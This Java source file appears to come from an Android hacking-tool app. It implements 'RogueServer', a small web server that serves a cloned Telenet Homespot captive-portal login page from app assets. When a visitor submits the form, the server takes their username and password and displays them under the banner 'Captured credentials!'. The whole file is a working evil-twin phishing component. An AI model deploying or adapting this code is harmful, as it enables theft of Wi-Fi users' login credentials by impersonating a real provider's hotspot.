package com.izoman.hcktool.expert.roguenetwork;

import android.content.Context;
import android.os.Handler;
import android.util.Log;
import android.widget.TextView;

import org.nanohttpd.protocols.http.IHTTPSession;
import org.nanohttpd.protocols.http.NanoHTTPD;
import org.nanohttpd.protocols.http.response.Response;
import org.nanohttpd.protocols.http.response.Status;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.FileNameMap;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Random;

import static android.content.ContentValues.TAG;
import static java.net.HttpURLConnection.HTTP_OK;
import static org.nanohttpd.protocols.http.response.Response.newFixedLengthResponse;

/**
 * Created by umuts on 10-Aug-17.
 */

public class RogueServer extends NanoHTTPD {
    TextView output;
    private Handler mHandler;
    private Context mContext;

    public RogueServer(int port, Handler mHandler, TextView output, Context mContext) {
        super(port);
        this.mHandler = mHandler;
        this.output = output;
        this.mContext = mContext;
    }

    @Override
    public Response handle(IHTTPSession session) {
        try {
            session.parseBody(new HashMap<String, String>());
            Map<String, List<String>> params = session.getParameters();
            if (params.get("username") != null || params.get("password") != null) {
                final String username = params.get("username").get(0);
                final String password = params.get("password").get(0);
                mHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        // Update UI
                        output.append("-*-*-*-*-*Captured credentials!-*-*-*-*-*\n");
                        output.append("Username: " + username + "\n");
                        output.append("Password: " + password + "\n");
                    }
                });
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ResponseException e) {
            e.printStackTrace();
        };

        return super.handle(session);

    }

    @Override
    public Response serve(IHTTPSession session) {
       String uri =  session.getUri();
        // Let's get the goodies from post :)
        final StringBuilder buf = new StringBuilder();
        for (Map.Entry<String, String> kv : session.getHeaders().entrySet())
            buf.append(kv.getKey() + " : " + kv.getValue() + "\n");
        InputStream mbuffer = null;
        try {
            if(uri!=null){
                if(uri.contains(".js")){
                    mbuffer = mContext.getAssets().open("TELENETHOMESPOT/" +uri.substring(1));
                    return new Response(Status.OK, MIME_JS, mbuffer, mbuffer.available());
                }else if(uri.contains(".css")){
                    mbuffer = mContext.getAssets().open("TELENETHOMESPOT/" +uri.substring(1));
                    return new Response(Status.OK, MIME_CSS, mbuffer, mbuffer.available());

                }else if(uri.contains(".png")){
                    mbuffer = mContext.getAssets().open("TELENETHOMESPOT/" + uri.substring(1));
                    return new Response(Status.OK, MIME_PNG, mbuffer, mbuffer.available());
                }else{
                    mbuffer = mContext.getAssets().open("TELENETHOMESPOT/index.html");
                    return new Response(Status.OK, MIME_HTML, mbuffer, mbuffer.available());
                }
            }

        } catch (IOException e) {
            Log.d(TAG,"Error opening file"+uri.substring(1));
            e.printStackTrace();
        }
        return null;
    }

    /**
     * Common mime types for dynamic content
     */
    public static final String
            MIME_PLAINTEXT = "text/plain",
            MIME_HTML = "text/html",
            MIME_JS = "application/javascript",
            MIME_CSS = "text/css",
            MIME_PNG = "image/png",
            MIME_DEFAULT_BINARY = "application/octet-stream",
            MIME_XML = "text/xml";
}
